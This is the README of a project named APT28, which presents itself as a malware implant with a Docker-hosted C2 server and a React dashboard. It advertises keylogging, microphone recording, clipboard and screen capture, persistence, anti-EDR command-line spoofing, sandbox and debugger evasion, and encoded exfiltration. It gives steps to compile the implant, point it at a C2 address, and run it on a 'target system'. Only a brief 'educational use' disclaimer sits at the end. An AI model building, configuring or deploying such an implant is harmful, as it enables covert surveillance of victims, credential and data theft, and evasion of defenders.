# APT28

[![Build & Release](https://github.com/getel-arch/APT28/actions/workflows/build_and_release.yaml/badge.svg)](https://github.com/getel-arch/APT28/actions/workflows/build_and_release.yaml)

Advanced malware implant with C2 infrastructure and web-based management dashboard.

## Features

### Implant Capabilities
- **Audio Recording**: Capture audio from microphone
- **Clipboard Monitoring**: Monitor clipboard content
- **Keylogging**: Capture keyboard input
- **Screenshots**: Capture screen images
- **System Information**: Collect system metadata
- **Command Execution**: Execute commands with cmdline evasion (anti-EDR)
- **Persistence**: Maintain access across reboots
- **Anti-Analysis**: VM/sandbox detection, debugger checks

### C2 Server (Docker-Only)
- **Web Dashboard**: React-based UI for managing operations
- **REST API**: Complete HTTP API for client communication
- **Real-time Monitoring**: Track client status and activity
- **Result Management**: View and analyze execution results
- **Multi-client Support**: Manage multiple simultaneous clients
- **Containerized**: Docker-only deployment for security

## Quick Start

### C2 Server Deployment

```bash
cd c2_server
docker-compose up --build
```

Access the dashboard at: **http://localhost:8080**

See [C2 Server Documentation](c2_server/README.md) for details.

### Building the Implant

Compile the Windows implant:

```bash
# Using MinGW on Linux
cd src
x86_64-w64-mingw32-gcc -o APT28.exe main.c -lwininet -lws2_32 -mwindows

# Or use the automated build system
# See .github/workflows/build_and_release.yaml
```

## Project Structure

```
APT28/
├── src/                    # Implant source code (C)
│   ├── main.c
│   ├── c2_handler.c
│   ├── command_executor.c  # Cmdline evasion capability
│   ├── audio_recorder.c
│   ├── clipboard_monitor.c
│   ├── keylogger.c
│   ├── screenshot.c
│   ├── info_collector.c
│   └── ...
├── c2_server/              # C2 Server (Docker)
│   ├── app.py              # Flask backend
│   ├── Dockerfile          # Multi-stage build
│   ├── docker-compose.yml  # Deployment config
│   ├── frontend/           # React dashboard
│   │   ├── src/
│   │   │   ├── App.js
│   │   │   ├── components/
│   │   │   └── ...
│   │   └── package.json
│   └── README.md
├── C2_API.md               # API documentation
├── VERSION
└── README.md               # This file
```

## Documentation

- [C2 Server README](c2_server/README.md) - Server deployment and usage
- [C2 API Documentation](C2_API.md) - Complete API reference
- [Docker Deployment](c2_server/DOCKER_DEPLOYMENT.md) - Docker guide

## Capabilities

| ID | Capability | Description |
|----|-----------|-------------|
| 1 | Audio Recorder | Record from microphone |
| 2 | Clipboard Monitor | Monitor clipboard activity |
| 3 | Keylogger | Capture keystrokes |
| 4 | Screenshot | Capture screen |
| 5 | Info Collector | System information |
| 6 | Command Executor | Execute with cmdline evasion |

## Usage

### 1. Deploy C2 Server

```bash
cd c2_server
docker-compose up -d
```

### 2. Configure Implant

Edit `c2_handler.c`:
```c
#define C2_SERVER "your-server-ip"
#define C2_PORT 8080
```

### 3. Build Implant

```bash
cd src
x86_64-w64-mingw32-gcc -o APT28.exe main.c -lwininet -lws2_32 -mwindows
```

### 4. Deploy to Target

Transfer `APT28.exe` to target system and execute.

### 5. Manage via Dashboard

Open http://localhost:8080 and use the web interface to:
- View connected clients
- Send capability commands
- View execution results

## Security & Evasion

### Anti-Analysis Features
- VM/Sandbox detection (VMware, VirtualBox, QEMU)
- Debugger detection
- Mutex-based single instance
- Cmdline argument spoofing (evades EDR logging)

### Stealth Features
- No console window (`-mwindows`)
- Minimal memory footprint
- Randomized beacon intervals (60-120s)
- Base64 encoding for data exfiltration

## Warning

⚠️ **Educational/Research Use Only**

This software is for educational and authorized security research purposes only. Unauthorized use of this software to attack targets without prior mutual consent is illegal. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

## License

See [LICENSE](LICENSE) file for details.

## References

- [C2 API Documentation](C2_API.md)
- [Flask Documentation](https://flask.palletsprojects.com/)
- [React Documentation](https://react.dev/)
- [Docker Documentation](https://docs.docker.com/)
